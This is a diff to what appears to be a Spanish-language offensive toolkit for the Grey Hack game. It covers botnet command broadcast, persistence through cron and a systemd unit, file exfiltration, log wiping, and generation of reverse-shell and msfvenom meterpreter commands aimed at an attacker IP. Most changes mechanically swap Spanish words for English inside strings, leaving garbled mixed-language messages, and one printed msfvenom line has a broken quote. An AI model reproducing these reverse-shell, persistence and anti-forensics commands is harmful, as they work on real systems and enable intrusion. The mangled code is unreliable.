@@ -654,7 +654,7 @@ end if
 end function
 ataque_local = function()
 comp = get_shell.host_computer
-print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Escaneando librerias en /lib..." + "</color>")
+print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Escaneando librerias in /lib..." + "</color>")
 lib_folder = comp.File("/lib")
 if (not lib_folder) then
 print("<color=#ff1744>[X] </color><color=#ffffff>" + "No se pudo acceder a /lib" + "</color>")
@@ -852,7 +852,7 @@ opciones = [
 {"label": "Ver nodos activos", "cmd": "info"},
 {"label": "Establecer Callback (rshell)", "cmd": "callback"},
 {"label": "Esperar conexiones", "cmd": "server"},
-{"label": "Ejecutar comando en nodos", "cmd": "exec"},
+{"label": "Ejecutar comando in nodos", "cmd": "exec"},
 ]
 modo = menu_interactivo("CONTROL DE BOTNET", opciones)
 if (not modo) then; return
@@ -920,7 +920,7 @@ end if
 end function
 botnet_esperar_conexiones = function()
 print("<color=#00e5ff>[#] </color><color=#ffffff>" + "ESPERANDO CONEXIONES DE BOTNET..." + "</color>")
-print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Usa 'nc -lvp <puerto>' para escuchar." + "</color>")
+print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Usa 'nc -lvp <puerto>' for escuchar." + "</color>")
 metax = include_lib("/lib/metaxploit.so")
 if (not metax) then
 print("<color=#ff1744>[X] </color><color=#ffffff>" + "Metaxploit not disponible." + "</color>")
@@ -944,15 +944,15 @@ end if
 comando = __nini_pedir("Comando a ejecutar: ")
 if (comando == "") then; return
 end if
-print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Ejecutando en " + str(enjambre.len) + " nodos..." + "</color>")
+print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Ejecutando in " + str(enjambre.len) + " nodos..." + "</color>")
 for nodo in enjambre
 ip_nodo = nodo.key
 sesion = nodo.value
 if (typeof(sesion) == "shell") then
 sesion.launch("/bin/sh", "-c '" + comando + "'")
-print("<color=#00ff41>[OK] </color><color=#ffffff>" + "Ejecutado en " + ip_nodo + "</color>")
+print("<color=#00ff41>[OK] </color><color=#ffffff>" + "Ejecutado in " + ip_nodo + "</color>")
 else
-print("<color=#ff1744>[X] </color><color=#ffffff>" + "Sin shell en " + ip_nodo + "</color>")
+print("<color=#ff1744>[X] </color><color=#ffffff>" + "Sin shell in " + ip_nodo + "</color>")
 end if
 end for
 end function
@@ -972,7 +972,7 @@ else if (typeof(sesion) == "computer") then
 computer_node = sesion
 end if
 if (computer_node) then
-print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Escaneando /etc/passwd en " + ip_nodo + "</color>")
+print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Escaneando /etc/passwd in " + ip_nodo + "</color>")
 archivo = computer_node.File("/etc/passwd")
 if (archivo and archivo.has_permission("r")) then
 print("<color=#00ff41>[OK] </color><color=#ffffff>" + "Sombra obtenida. Desplegando algoritmos crypto..." + "</color>")
@@ -987,7 +987,7 @@ else
 print("<color=#ff1744>[X] </color><color=#ffffff>" + "Fallo al inyectar auto-hacker crypto." + "</color>")
 end if
 else
-print("<color=#ff1744>[X] </color><color=#ffffff>" + "Proteccion detectada en " + ip_nodo + "</color>")
+print("<color=#ff1744>[X] </color><color=#ffffff>" + "Proteccion detectada in " + ip_nodo + "</color>")
 end if
 end if
 end for
@@ -1044,13 +1044,13 @@ cron.set_content(cron.get_content + char(10) + "@reboot " + cmd)
 print("<color=#00ff41>[OK] </color><color=#ffffff>" + "Cron job agregado." + "</color>")
 end function
 persistencia_ver = function()
-print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Persistencia activa en el objetivo." + "</color>")
-print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Usa 'vault' para ver credenciales." + "</color>")
+print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Persistencia activa in el objetivo." + "</color>")
+print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Usa 'vault' for ver credenciales." + "</color>")
 end function
 modulo_botnet_persistir = function()
 if (enjambre.len == 0) then; error("Enjambre vacío."); return
 end if
-print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Instalando en " + str(enjambre.len) + " nodos..." + "</color>")
+print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Instalando in " + str(enjambre.len) + " nodos..." + "</color>")
 for nodo in enjambre
 ip = nodo.key
 sesion = nodo.value
@@ -1064,9 +1064,9 @@ computer_node.touch("/lib/systemd/system/", "revenant.service")
 archivo = computer_node.File("/lib/systemd/system/revenant.service")
 if (archivo) then
 archivo.set_content("[Unit]\nDescription=Revenant\n[Service]\nExecStart=/bin/sh")
-print("<color=#00ff41>[OK] </color><color=#ffffff>" + "Instalado en " + ip + "</color>")
+print("<color=#00ff41>[OK] </color><color=#ffffff>" + "Instalado in " + ip + "</color>")
 end if
-else; error("Sin permisos en " + ip)
+else; error("Sin permisos in " + ip)
 end if
 end for
 end function
@@ -1128,7 +1128,7 @@ end if
 if (f) then
 f.set_content(serializar_vault(_vault_data))
 else
-print("<color=#ff1744>[X] </color><color=#ffffff>" + "Fallo de persistencia: El Vault not puede escribirse en " + p + "</color>")
+print("<color=#ff1744>[X] </color><color=#ffffff>" + "Fallo de persistencia: El Vault not puede escribirse in " + p + "</color>")
 end if
 end function
 guardar_credencial = function(ip, usuario, clave, priv, lan)
@@ -1287,7 +1287,7 @@ opciones = [
 modo = menu_interactivo("FUERZA BRUTA", opciones)
 if (not modo) then; return
 end if
-if (modo == "ssh") then; info("SSH brute not disponible en GH. Usa Metaxploit.")
+if (modo == "ssh") then; info("SSH brute not disponible in GH. Usa Metaxploit.")
 else if (modo == "ftp") then; intel_ftp_anonimo()
 else if (modo == "passwd") then; intel_crack_passwd()
 end if
@@ -1337,7 +1337,7 @@ print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Escaneando subred desde " 
 end if
 hosts = __nini_descubrir_red_local()
 if (hosts.len == 0) then
-print("<color=#ffea00>[!] </color><color=#ffffff>" + "No se detectaron otros hosts activos en la subred." + "</color>")
+print("<color=#ffea00>[!] </color><color=#ffffff>" + "No se detectaron otros hosts activos in la subred." + "</color>")
 else
 print("<color=#00ff41>[OK] </color><color=#ffffff>" + "Hosts detectados: " + hosts.len + "</color>")
 columnas = ["IP", "Estado"]
@@ -1365,30 +1365,30 @@ else
 sesion = enjambre[globals.objetivo_actual]
 end if
 if (not sesion or typeof(sesion) != "shell") then
-print("<color=#ff1744>[X] </color><color=#ffffff>" + "Se requiere una shell activa para inyectar." + "</color>")
+print("<color=#ff1744>[X] </color><color=#ffffff>" + "Se requiere una shell activa for inyectar." + "</color>")
 return
 end if
-print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Inyectando Revenant en " + globals.objetivo_actual + "..." + "</color>")
+print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Inyectando Revenant in " + globals.objetivo_actual + "..." + "</color>")
 rutas = ["/bin", "/usr/bin", "/tmp", "/var", "/home/guest"]
 for r in rutas
 exito_inj = __nini_replicar_binario(sesion, r)
 if (exito_inj) then
-print("<color=#00ff41>[OK] </color><color=#ffffff>" + "Revenant inyectado and oculto en " + r + "</color>")
+print("<color=#00ff41>[OK] </color><color=#ffffff>" + "Revenant inyectado and oculto in " + r + "</color>")
 return
 end if
 end for
-print("<color=#ff1744>[X] </color><color=#ffffff>" + "No se pudo inyectar el binario en ninguna ruta conocida." + "</color>")
+print("<color=#ff1744>[X] </color><color=#ffffff>" + "No se pudo inyectar el binario in ninguna ruta conocida." + "</color>")
 end function
 modulo_escalada_analizar = function()
 if (globals.objetivo_actual == null) then
-print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Escaneando sistema local para escalada de privilegios..." + "</color>")
+print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Escaneando sistema local for escalada de privilegios..." + "</color>")
 sesion = get_shell
 else
-print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Buscando vectores de PrivEsc en " + globals.objetivo_actual + "</color>")
+print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Buscando vectores de PrivEsc in " + globals.objetivo_actual + "</color>")
 sesion = enjambre[globals.objetivo_actual]
 end if
 if (not sesion) then
-print("<color=#ff1744>[X] </color><color=#ffffff>" + "No hay sesion activa para el análisis." + "</color>")
+print("<color=#ff1744>[X] </color><color=#ffffff>" + "No hay sesion activa for el análisis." + "</color>")
 return
 end if
 resultado = __nini_buscar_vectores_escalada(sesion)
@@ -1482,11 +1482,12 @@ _pipe0 = (router_nodo)
 dispositivos = __nini_lan_ips_from_node(sesion, _pipe0)
 if (dispositivos and dispositivos.len > 0) then
 print("<color=#00ff41>[OK] </color><color=#ffffff>" + "Dispositivos: " + str(dispositivos.len) + "</color>")
-if para ip en dispositivos: info("  - " + ip + ((ip == ip_local) then
-    " (TU NODO)"
-else
-    ""))
+for ip in dispositivos
+nodo_tag = ""
+if (ip == ip_local) then; nodo_tag = " (TU NODO)"
 end if
+print("<color=#00e5ff>[#] </color><color=#ffffff>" + "  - " + ip + nodo_tag + "</color>")
+end for
 else
 red = ip_local.split(".")[0:3].join(".") + "."
 print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Escaneando: " + red + "0/24..." + "</color>")
@@ -1496,8 +1497,12 @@ ip = red + str(i)
 if (ip != ip_local and sesion.ping(ip) == 1) then; hosts.push(ip)
 end if
 end for
-if (hosts.len == 0) then; info("No se encontraron hosts.")
-else; para h en hosts: info("  - " + h)
+if (hosts.len == 0) then
+print("<color=#00e5ff>[#] </color><color=#ffffff>" + "No se encontraron hosts." + "</color>")
+else
+for h in hosts
+print("<color=#00e5ff>[#] </color><color=#ffffff>" + "  - " + h + "</color>")
+end for
 end if
 end if
 end function
@@ -1536,7 +1541,9 @@ end if
 return
 end if
 print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Puertos: " + str(puertos.len) + "</color>")
-para p en puertos: info("  [" + str(p.port_number) + "] " + __nini_port_info(p))
+for p in puertos
+    print("<color=#00e5ff>[#] </color><color=#ffffff>" + "  [" + str(p.port_number) + "] " + __nini_port_info(p) + "</color>")
+end for
 sel = val(__nini_pedir("Puerto a explotar: "))
 if (sel <= 0) then; return
 end if
@@ -1597,7 +1604,7 @@ if (globals.objetivo_actual == null) then
 print("<color=#ff1744>[X] </color><color=#ffffff>" + "No hay objetivo." + "</color>")
 return
 end if
-ruta_remota = __nini_pedir("Ruta del archivo en el objetivo: ")
+ruta_remota = __nini_pedir("Ruta del archivo in el objetivo: ")
 if (ruta_remota == "") then; return
 end if
 ruta_local = __nini_pedir("Ruta local de destino: ")
@@ -1618,7 +1625,7 @@ else
 print("<color=#ff1744>[X] </color><color=#ffffff>" + "Archivo not encontrado." + "</color>")
 end if
 else
-print("<color=#ff1744>[X] </color><color=#ffffff>" + "No hay sesion activa para el objetivo." + "</color>")
+print("<color=#ff1744>[X] </color><color=#ffffff>" + "No hay sesion activa for el objetivo." + "</color>")
 end if
 end function
 modulo_exfil_upload = function()
@@ -1659,7 +1666,7 @@ else if (tipo_shell == "netcat") then
 shell_generado = "nc -e /bin/sh " + ip_atacante + " " + puerto
 end if
 dibujar_ventana("REVERSE SHELL GENERADO", shell_generado)
-print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Copia and ejecuta en el objetivo." + "</color>")
+print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Copia and ejecuta in el objetivo." + "</color>")
 print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Listener: nc -lvp " + puerto + "</color>")
 end function
 modulo_payloads_generar = function()
@@ -1688,7 +1695,7 @@ else if (tipo_payload == "php") then
 payload_info = "php/meterpreter/reverse_tcp"
 print("<color=#00e5ff>[#] </color><color=#ffffff>" + "msfvenom -p " + payload_info + " LHOST=" + ip_atacante + " LPORT=" + puerto + " -f raw > shell.php + "</color>")
 end if
-print("<color=#00ff41>[OK] </color><color=#ffffff>" + "Payload configurado para " + ip_atacante + ":" + puerto + "</color>")
+print("<color=#00ff41>[OK] </color><color=#ffffff>" + "Payload configurado for " + ip_atacante + ":" + puerto + "</color>")
 end function
 modulo_limpieza_ejecutar = function()
 opciones_clean = [
@@ -1740,7 +1747,7 @@ cont = cont + 1
 end if
 end for
 print("<color=#00ff41>[OK] </color><color=#ffffff>" + "Logs limpiados: " + str(cont) + "</color>")
-print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Archivos en blanco - sin rastros de conexión/desconexión." + "</color>")
+print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Archivos in blanco - sin rastros de conexión/desconexión." + "</color>")
 end function
 limpieza_historial = function()
 print("<color=#00e5ff>[#] </color><color=#ffffff>" + "Limpiando historial de comandos..." + "</color>")
